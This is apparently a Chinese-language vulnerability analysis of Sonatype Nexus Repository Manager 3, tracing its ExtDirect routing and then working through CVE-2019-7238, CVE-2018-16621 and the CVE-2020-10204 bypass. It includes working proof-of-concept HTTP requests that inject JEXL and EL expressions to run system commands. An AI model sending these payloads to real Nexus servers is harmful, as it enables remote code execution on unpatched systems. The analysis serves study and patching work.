# Nexus Repository Manager

Nexus Repository Manager(Nexus仓库管理器)，一般用来搭建内部私服，通过它获取和管理所需的maven构件。常用的maven仓库管理器包括：Apache Archiva、JFrog Artifactory、Sonatype Nexus。

官方下载地址： https://help.sonatype.com/repomanager3/product-information/download/download-archives---repository-manager-3

源码下载地址： https://github.com/sonatype/nexus-public/releases

解压下载后的文件夹，Windows下终端执行`nexus.exe /run`，Linux下运行`./nexus run`，终端上出现类似`Started Sonatype Nexus OSS 3.13.0-01`的字样，即可访问`http://localhost:8081/`

远程调试：在`/bin/nexus.vmoptions`文件中添加`-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5555`，然后重新运行`./nexus run`。IDEA对应配置远程连接即可

默认的账号密码`admin admin123`

## 路由分析
根据文件夹结构`/etc/jetty/`可知，Nexus用Jetty做服务器，下层名为`nexus-web.xml`的文件，其中仅配置了一个Filter，对所有的路由做过滤，没有配置Servlet。那么很可能根据传入Filter的参数，动态分配Servlet
```xml
 <filter>
    <filter-name>nexusFilter</filter-name>
    <filter-class>org.sonatype.nexus.bootstrap.osgi.DelegatingFilter</filter-class>
  </filter>

  <filter-mapping>
    <filter-name>nexusFilter</filter-name>
    <url-pattern>/*</url-pattern>
    <dispatcher>REQUEST</dispatcher>
    <dispatcher>ERROR</dispatcher>
  </filter-mapping>
```
跟进DelegatingFilter，一般Filter设计的核心都是doFilter方法，其内容如下：
```java
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException,ServletException{
    Filter filter = delegate;
    if (filter != null) {
      filter.doFilter(request, response, chain);
    }
}
```
跟进`filter.doFilter`，核心代码如下
```java
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
    FilterPipeline filterPipeline = this.getFilterPipeline();
        
    try {
        filterPipeline.dispatch(servletRequest, servletResponse, filterChain);
    } ...
}
```
代码首先通过`this.getFilterPipeline();`获取了定义的servletPipeline，管道中一共定义了12个servlet。了解Servlet是如何被调用的之前，需要知道Nexus用了一些框架，以下载的`nexus-3.13.0-01`安装环境为例，下层有一个`system`文件夹，包含了许多用到的第三方库，例如`com.google.inject`。它对应的是谷歌推出的**Guice框架**，解决Java中依赖注入的问题。

Spring在实现依赖注入的时候，是通过`applicationContext.xml`进行配置，而Guice框架，则是通过**继承`AbstractModule`类并重写`configure`方法的方式**。如果采用Guice配置Servlet，核心的两句代码如下（以`ExtDirectModule`中的代码为例）
```java
@Named
public class ExtDirectModule extends AbstractModule{
  @Override
  protected void configure() {
    install(new ServletModule()
    {
      @Override
      protected void configureServlets() {
        ...
        serve("/service/extdirect" + "*").with(ExtDirectServlet.class, config); // 配置Servlet和对应的路由
        filter("/service/extdirect" + "*").through(SecurityFilter.class);
      }
    });
}
```

那么12个Servlet中Nexus自定义的Servlet和对应的xxModule中配置的路由如下：
```
org.sonatype.nexus.internal.web.ErrorPageServlet       /*
org.sonatype.nexus.internal.web.ThrowServlet       /*
org.sonatype.nexus.internal.metrics.MetricsServlet       /service/metrics
org.sonatype.nexus.internal.metrics.HealthCheckServlet       /service/metrics
com.sonatype.nexus.plugins.outreach.internal.OutreachServlet
org.sonatype.nexus.repository.httpbridge.internal.ViewServlet   /repository | /content/groups/* | /content/repositories/* | /content/sites/*
org.sonatype.nexus.siesta.SiestaServlet        /service/rest
org.sonatype.nexus.rapture.internal.security.SessionServlet
org.sonatype.nexus.extdirect.internal.ExtDirectServlet       /service/extdirect
org.sonatype.nexus.internal.webresources.WebResourceServlet       /*
```
Guice定义路由时配置了相应的Filter，`filterPipeline.dispatch`时会根据路由分发到对应的Servlet。进入到Servlet的`doPost()`或`doGet()`等方法中

上面这些Servlet还有一点值得注意，除`ExtDirectServlet`，都直接继承自HttpServlet。`ExtDirectServlet`则是直接继承自`DirectJNgineServlet`，该类位于`directjngine.jar`，它允许应用程序使用ExtJS调用Java方法。

DirectJNgineServlet类处理请求的过程大致如下：
```
public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
  ...
  RequestType type = getFromRequestContentType(request); 获取Content-Type的类型
  this.processRequest(request, response, type); -> 根据Content-Type的类型调用不同的处理方法，处理方法大多位于directjngine.jar的RequestRouter类中
}
```
以处理`Content-Type: application/json`的`RequestRouter.processJsonRequest()`方法为例
```java
public void processJsonRequest(Reader reader, Writer writer) throws IOException {
    (new JsonRequestProcessor(this.registry, this.dispatcher, this.globalConfiguration)).process(reader, writer);
}
```

<details>
    <summary>registry存储的action</summary>
    <pre>
    <code>
"nuget_NuGetApiKey" -> com.sonatype.nexus.repository.nuget.internal.security.NugetApiKeyComponent
"coreui_Webhook" -> org.sonatype.nexus.coreui.WebhookComponent
"capability_Capability" -> org.sonatype.nexus.coreui.internal.capability.CapabilityComponent
"coreui_Role" -> org.sonatype.nexus.coreui.RoleComponent
"firewall_RepositoryStatus" -> com.sonatype.nexus.plugins.firewall.internal.ui.FirewallRepositoryStatusComponent
"rapture_State" -> org.sonatype.nexus.rapture.internal.state.StateComponent
"coreui_Blobstore" -> org.sonatype.nexus.coreui.BlobStoreComponent
"coreui_Browse" -> org.sonatype.nexus.coreui.BrowseComponent
"analytics_Settings" -> com.sonatype.nexus.analytics.internal.ui.SettingsComponent
"migration_Assistant" -> com.sonatype.nexus.migration.ui.AssistantComponent
"coreui_Component" -> org.sonatype.nexus.coreui.ComponentComponent
"coreui_Task" -> org.sonatype.nexus.coreui.TaskComponent
"outreach_Outreach" -> com.sonatype.nexus.plugins.outreach.internal.ui.OutreachComponent
"s3_S3" -> org.sonatype.nexus.blobstore.s3.internal.ui.S3Component
"healthcheck_Info" -> com.sonatype.nexus.plugins.healthcheck.oss.internal.ui.HealthCheckInfoComponent
"coreui_Upload" -> org.sonatype.nexus.coreui.UploadComponentComponent
"coreui_DatabaseFreeze" -> org.sonatype.nexus.coreui.DatabaseFreezeComponent
"coreui_Selector" -> org.sonatype.nexus.coreui.SelectorComponent
"coreui_User" -> org.sonatype.nexus.coreui.UserComponent
"coreui_HttpSettings" -> org.sonatype.nexus.coreui.HttpSettingsComponent
"rapture_LogEvent" -> org.sonatype.nexus.rapture.internal.logging.LogEventComponent
"rapture_Security" -> org.sonatype.nexus.rapture.internal.security.SecurityComponent
"licensing_Licensing" -> com.sonatype.nexus.licensing.internal.ui.LicensingComponent
"logging_Loggers" -> org.sonatype.nexus.coreui.internal.log.LoggersComponent
"migration_Repository" -> com.sonatype.nexus.migration.ui.RepositoryComponent
"analytics_Events" -> com.sonatype.nexus.analytics.internal.ui.EventsComponent
"migration_Progress" -> com.sonatype.nexus.migration.ui.ProgressComponent
"audit_Audit" -> org.sonatype.nexus.audit.internal.ui.AuditComponent
"coreui_Search" -> org.sonatype.nexus.coreui.SearchComponent
"healthcheck_Status" -> com.sonatype.nexus.plugins.healthcheck.ui.HealthCheckStatusComponent
"coreui_AnonymousSettings" -> org.sonatype.nexus.coreui.AnonymousSettingsComponent
"coreui_Privilege" -> org.sonatype.nexus.coreui.PrivilegeComponent
"ldap_LdapServer" -> org.sonatype.nexus.ldap.internal.ui.LdapServerComponent
"clm_CLM" -> com.sonatype.nexus.clm.internal.ui.ClmComponent
"ssl_Certificate" -> com.sonatype.nexus.ssl.plugin.internal.ui.CertificateComponent
"atlas_SupportZip" -> org.sonatype.nexus.coreui.internal.atlas.SupportZipComponent
"proui_Database" -> com.sonatype.nexus.proui.internal.orient.DatabaseQuorumResetComponent
"ssl_TrustStore" -> com.sonatype.nexus.ssl.plugin.internal.ui.TrustStoreComponent
"coreui_Repository" -> org.sonatype.nexus.coreui.RepositoryComponent
"ClmStateContributor" -> com.sonatype.nexus.clm.internal.ui.ClmStateContributor
"logging_Log" -> org.sonatype.nexus.coreui.internal.log.LogComponent
"coreui_Email" -> org.sonatype.nexus.coreui.EmailComponent
"coreui_Bundle" -> org.sonatype.nexus.coreui.BundleComponent
"ahc_Component" -> com.sonatype.nexus.ahc.internal.AhcComponent
"node_NodeAccess" -> org.sonatype.nexus.coreui.internal.node.NodeAccessComponent
"coreui_RealmSettings" -> org.sonatype.nexus.coreui.RealmSettingsComponent
"atlas_SystemInformation" -> org.sonatype.nexus.coreui.internal.atlas.SystemInformationComponent
    </code>
    </pre>
</details>

process方法的有两步较为核心。
```java
public String process(Reader reader, Writer writer) throws IOException {
  ...
  JsonRequestData[] requests = this.getIndividualJsonRequests(requestString); // （1）
  responses = this.processIndividualRequestsInThisThread(requests); // （2）
}
```

（1）对传入的请求进行处理，对关键字内容进行提取

在`JsonRequestProcessor.getIndividualJsonRequests()`中，调用`createIndividualJsonRequest`方法对JSON内容进行提取，包含五个变量：`action、method、tid、type、data`
```java
    private static JsonRequestData createIndividualJsonRequest(JsonObject element) {
        assert element != null;

        String action = getNonEmptyJsonString(element, "action");
        String method = getNonEmptyJsonString(element, "method");
        Long tid = getNonEmptyJsonLong(element, "tid");
        String type = getNonEmptyJsonString(element, "type");
        JsonArray jsonData = getMethodParametersJsonData(element); // 取"data"
        JsonRequestData result = new JsonRequestData(type, action, method, tid, jsonData);
        return result;
    }
```
通过上面registry存储的action可以看出，action代表了一个类，而method就是类中的方法（类中的方法都用`@DirectMethod`注解标注）

（2）反射调用传入的类方法
`JsonRequestProcessor.processIndividualRequest()`最终会调用到`DispatcherBase.invokeJavaMethod()`，该方法反射调用action.method对应的方法，参数为data中取出的值
```java
protected static final Object invokeJavaMethod(Object instance, @NonNull Method method, @NonNull Object[] parameters) throws Exception {
  var5 = method.invoke(instance, parameters);
}
```

总体来说，整个流程就是通过Guice框架Module中配置的路由找到对应的Servlet，如果是ExtDirectServlet，根据Content-Type类型用不同的方法对请求进行处理，但核心都是根据JSON内容中的action、method。反射调用到对应的类方法。并将JSON内容中的data作为方法参数传递。


## 历史漏洞

|漏洞编号|漏洞类型|影响版本|
|:---:|:---:|:---:|
|CVE-2019-7238|JEXL RCE|< 3.15.0|
|CVE-2018-16621|EL RCE|< 3.14|
|CVE-2020-10199|EL RCE|< 3.21.2|
|CVE-2020-10204|EL RCE|< 3.21.2|
|CVE-2020-11444|越权|<= 3.21.2|
|CVE-2020-29436|XXE|< 3.29.0|
|CVE-2019-5475|RCE|<= 2.14.13|
|CVE-2019-15588(bypass CVE-2019-5475)|RCE|<= 2.14.1|

### CVE-2019-7238
利用前提：maven-releases下有项目（或者自己上传一个jar包）
Diff: 3.15.0+版本`ComponentComponent`类增加了权限校验
```
+ @RequiresPermissions('nexus:selectors:*')
PagedResponse<AssetXO> previewAssets(final StoreLoadParameters parameters) {...}
```

POC: 
```
POST /service/extdirect HTTP/1.1
Content-Type: application/json


{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":
[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('open -a Calculator')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":26}
```

漏洞定位在`ComponentComponent.previewAssets()`方法。根据路由分析中的内容，想要触发此方法，传入的JSON内容框架如下
```
{
    "action":"coreui_Component",
    "method":"previewAssets",
    "data":[],
    "type":rpc,
    "tid":数字
}
```
那么现在就需要分析`previewAssets()`方法需要传入怎样的参数从而造成危害
```java
  @DirectMethod
  @Timed
  @ExceptionMetered
  PagedResponse<AssetXO> previewAssets(final StoreLoadParameters parameters) {
    // （1）从filter中获取三个参数
    String repositoryName = parameters.getFilter('repositoryName')
    String expression = parameters.getFilter('expression')
    String type = parameters.getFilter('type')
    if (!expression || !type || !repositoryName) {
      return null
    }

    // （2）创建表达式
    RepositorySelector repositorySelector = RepositorySelector.fromSelector(repositoryName)
    if (type == JexlSelector.TYPE) {
      jexlExpressionValidator.validate(expression)
    }
    else if (type == CselSelector.TYPE) {
      cselExpressionValidator.validate(expression);
    }
    List<Repository> selectedRepositories = getPreviewRepositories(repositorySelector)
    if (!selectedRepositories.size()) {
      return null
    }

    
    // （3）
    def result = browseService.previewAssets(
        repositorySelector,
        selectedRepositories,
        expression,
        toQueryOptions(parameters))
    return new PagedResponse<AssetXO>(
        result.total,
        result.results.collect(ASSET_CONVERTER.rcurry(null, null, [:], 0)) // buckets not needed for asset preview screen
    )
  }
```
**（1）从filter中获取三个参数**
```java
public String getFilter(String property) {
  checkNotNull(property, "property"); 
  if (filter != null) {
    for (Filter item : filter) {
      if (property.equals(item.getProperty())) { // 获取filter的property
        return item.getValue(); // 获取filter的value
      }
    }
  }
  return null;
}
```
所以三个参数值的传入格式应为
```
"filter":
[
    {
        "property":"repositoryName",
        "value":"xxx"
    },
    {
        "property":"expression",
        "value":"xxx"
    },
    {
        "property":"type",
        "value":"xxx"
    }
]
```

**（2）创建表达式**

其中"JexlSelector"有着明显的`jexl`字眼，很可能用到第三方组件`commons-jexl.jar`，作为一个表达式语言解析器，它也可以执行表达式，demo如下：
```java
String exp="''.class.forName('java.lang.Runtime').getRuntime().exec('open -a Calculator')";
JexlEngine jexlEngine=new JexlEngine();
Expression expression=jexlEngine.createExpression(exp);
JexlContext jc = new MapContext();
expression.evaluate(jc);
```
跟进`jexlExpressionValidator.validate()`方法来验证一下想法，跟进`createExpreesion()`，发现该方法位于`commons-jexl3-3.0.jar`中。所以如果存在`expression.evaluate()`调用的地方即可造成表达式注入。
```java
public void validate(String expression) {
    new JexlSelector(expression); // 创建构造器
}

public JexlSelector(final String expression) { // 构造器的具体代码
  this.expression = isNullOrEmpty(expression) ? Optional.<JexlExpression>empty()
      : Optional.of(threadLocalJexl.get().createExpression(CALLER_INFO, expression)); 
}
```
那么接下来就要看能否存在触发`evaluate()`的地方

（3）
首先执行的是`toQueryOptions(parameters)`，它从data中获取相应的内容
```java
private QueryOptions toQueryOptions(StoreLoadParameters storeLoadParameters) {
  def sort = storeLoadParameters.sort?.get(0)  // parameters构造需要满足StoreLoadParameters所需属性

  return new QueryOptions(
      storeLoadParameters.getFilter('filter'),
      sort?.property,
      sort?.direction,
      storeLoadParameters.start,
      storeLoadParameters.limit)
}

public class StoreLoadParameters // StoreLoadParameters属性包含如下
{
  private Integer page;
  private Integer start;
  private Integer limit;
  private List<Sort> sort;
  private List<Filter> filter;
  ...
}
```
根据代码对属性的定义，可以构造data的格式如下，其中filter的内容参照（1）从filter中获取三个参数 部分对filter构造的解析
```
"data":[
    {
        "page":数字,
        "start":数字,
        "limit":数字,
        "sort":[
            {
                "property":"xx",
                "direction":"xx"
            }
        ],
        "filter":[
            {
                xxx
            }
        ]
    }
]
```
接着执行的`BrowseServiceImpl.previewAssets()`方法
```java
public BrowseResult<Asset> v(final RepositorySelector repositorySelector,final List<Repository> repositories,final String jexlExpression,final QueryOptions queryOptions){
  ...
  PreviewAssetsSqlBuilder builder = new PreviewAssetsSqlBuilder(
      repositorySelector,
      jexlExpression,
      queryOptions,
      getRepoToContainedGroupMap(repositories));

  String whereClause = String.format("and (%s)", builder.buildWhereClause()); // PreviewAssetsSqlBuilder.buildWhereClause()

  //The whereClause is passed in as the querySuffix so that contentExpression will run after repository filtering
  return new BrowseResult<>(
      storageTx.countAssets(null, builder.buildSqlParams(), previewRepositories, whereClause),
      Lists.newArrayList(storageTx.findAssets(null, builder.buildSqlParams(),
          previewRepositories, whereClause + builder.buildQuerySuffix()))
  ); // 这一步会将sql进行拼接
}

public String buildWhereClause() { // 生成固定的字符串： and (contentExpression(@this, :jexlExpression, :repositorySelector, :repoToContainedGroupMap) == true)
  return whereClause("contentExpression(@this, :jexlExpression, :repositorySelector, " +
      ":repoToContainedGroupMap) == true", queryOptions.getFilter() != null);
}
```
在执行`storageTx.countAssets(null, builder.buildSqlParams(), previewRepositories, whereClause)`就已经弹出了计算器，跟进这句代码，发现会调用`MetadataNodeEntityAdapter.countByQuery()`
```java
long countByQuery(final ODatabaseDocumentTx db, @Nullable final String whereClause, @Nullable final Map<String, Object> parameters, @Nullable final Iterable<Bucket> buckets, @Nullable final String querySuffix)
{
    String query = buildQuery(true, whereClause, buckets, querySuffix);
    List<ODocument> results = db.command(new OCommandSQL(query)).execute(parameters);
    ...
    return results.get(0).field("count");
}
```

`buildQuery()`会生成如下的sql语句
```
select count(*) from asset where (bucket=#59:0 or bucket=#61:0 or bucket=#62:0 or bucket=#58:0 or bucket=#60:0 or bucket=#57:0 or bucket=#63:0) and (contentExpression(@this, :jexlExpression, :repositorySelector, :repoToContainedGroupMap) == true)
```
文件夹`/nexus-3.13.0-01/system/com/orientechnologies/orientdb-core/`可以确定用到了数据库**orientdb**，版本为2.2.36。但是访问如下的官网，函数列表中并没有`contentExpression`。

官方函数说明：http://orientdb.com/docs/2.2.x/SQL-Functions.html

全局搜索`contentExpression`，有个相关类`ContentExpressionFunction`，全局搜索evaluate，发现该类中`checkJexlExpression()`方法存在evaluate的调用
```java
public class ContentExpressionFunction extends OSQLFunctionAbstract
{
  public static final String NAME = "contentExpression";
  
  private boolean checkJexlExpression(final ODocument asset, final String jexlExpression, final String format)
  {
    VariableResolverAdapter variableResolverAdapter = variableResolverAdapterManager.get(format);
    VariableSource variableSource = variableResolverAdapter.fromDocument(asset);

    SelectorConfiguration selectorConfiguration = new SelectorConfiguration();

    selectorConfiguration.setAttributes(ImmutableMap.of("expression", jexlExpression));
    selectorConfiguration.setType(JexlSelector.TYPE);
    selectorConfiguration.setName("preview");

    try {
      return selectorManager.evaluate(selectorConfiguration, variableSource);
    }...
  }
```
对于为什么需要传一个jar包，可以看iswin大佬写的文章，思路很清晰，不再复述。https://iswin.org/2019/02/16/Nexus-Repository-Manager-3-RCE-CVE-2019-7238-Analysis/

### CVE-2018-16621
Ref: https://securitylab.github.com/research/bean-validation-RCE/

POC:
```
POST /service/extdirect HTTP/1.1
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
Content-Type: application/json
Cookie: NXSESSIONID=340d8fd9-8d0a-48a8-a120-1bef3b657ee2

{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["exp|${66*6}|"]}],"type":"rpc","tid":11}
```
Cookie在用户登陆后抓取数据包获得。如果Cookie错误，返回内容会报错`"message":"User is not permitted: nexus:users:update"`。

根据路由分析，`coreui_User`这个action对应`org.sonatype.nexus.coreui.UserComponent`。对应的方法`update()`内容如下
```java
  @DirectMethod
  @Timed
  @ExceptionMetered
  @RequiresAuthentication
  @RequiresPermissions('nexus:users:update')
  @Validate(groups = [Update.class, Default.class])
  UserXO update(@NotNull @Valid final UserXO userXO) {
    convert(securitySystem.updateUser(new User(
        userId: userXO.userId,
        version: userXO.version,
        source: DEFAULT_SOURCE,
        firstName: userXO.firstName,
        lastName: userXO.lastName,
        emailAddress: userXO.email,
        status: userXO.status,
        roles: userXO.roles?.collect {id ->
          new RoleIdentifier(DEFAULT_SOURCE, id)
        }
    )))
  }
```
参数中标注了`@Valid`，很容易想到是否存在Spring的`Hibernate-Validator`配置导致的表达式注入。关于该配置导致的问题见：https://www.jianshu.com/p/55c2b0641977

搜索nexus的system文件夹下的第三方库，找到`hibernate-validator-5.1.2.Final.jar`，那么很可能就存在表达式注入。传参时需要符合`UserXO`中的参数。`UserXO`代码如下
```java
@ToString(includePackage = false, includeNames = true)
class UserXO
{
  @NotBlank
  @UniqueUserId(groups = Create)
  String userId

  @NotBlank(groups = Update)
  String version

  // Null on create
  String realm

  @NotBlank
  String firstName

  @NotBlank
  String lastName

  @NotBlank
  @Email
  String email

  @NotNull
  UserStatus status

  @NotBlank(groups = Create.class)
  String password

  @NotEmpty
  @RolesExist(groups = [Create, Update])
  Set<String> roles

  Boolean external

  // FIXME: Sort out what this is used for
  Set<String> externalRoles
}
```
其中设定为`@NotBlank、@NotNull、@NotEmpty`的参数为必传参，包括`userId,version,firstName,lastName,email,status,password,roles`，在构造参数时需要将这些参数进行赋值。

想要触发RCE，需要找到自定义注解，并且校验逻辑中用到`buildConstraintViolationWithTemplate`。查看`UserXO`中的自定义注解，包括`@UniqueUserId、@RolesExist`。`@UniqueUserId`对应的`UniqueUserIdValidator`中的校验逻辑并没有用到`buildConstraintViolationWithTemplate`，但是`@RolesExist`对应的`RolesExistValidator`用到了
```java
@Named
public class RolesExistValidator extends ConstraintValidatorSupport<RolesExist, Collection<?>> // Collection<String> expected
{
  @Override
  public boolean isValid(final Collection<?> value, final ConstraintValidatorContext context) {
    List<Object> missing = new LinkedList<>();
    for (Object item : value) {
      try {
        authorizationManager.getRole(String.valueOf(item));
      }
      catch (NoSuchRoleException e) {
        missing.add(item); // 修复时改为 missing.add(getEscapeHelper().stripJavaEl(item.toString()));
      }
    }
    ...
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate("Missing roles: " + missing)
        .addConstraintViolation();
    return false;
  }
}
```
所以在构造时可以尝试向roles参数中注入表达式

修复时，增加了过滤方法`org.sonatype.nexus.common.template.EscapeHelper#stripJavaEl`，将`${`替换为`{`，避免表达式解析
```java
public String stripJavaEl(final String value){
    if (value!=null){
        return value.replaceAll("\\$+\\{", "{");
    }
    return null;
}
```


### CVE-2020-10204
Ref: https://securitylab.github.com/advisories/GHSL-2020-015-nxrm-sonatype/

pwntester还上述链接中列出了所有受影响的endpoints。CVE-2020-10204是CVE-2018-16621的绕过，`$\\x`格式不会被`stripJavaEl()`过滤，也就是如果payload形为`$\\x{}`就可以绕过CVE-2018-16621的修复，从而执行表达式。

对此漏洞进行修复是在CVE-2018-16621的过滤方法`stripJavaEL()`上增加了针对性的过滤条件
```java
public String stripJavaEl(final String value){
  if (value != null){
    return value.replaceAll("\\$+\\{","{").replaceAll("\\$+\\\\A\\{","{");
  }
  return null;
}
```

### CVE-2020-10199
Ref: https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype/
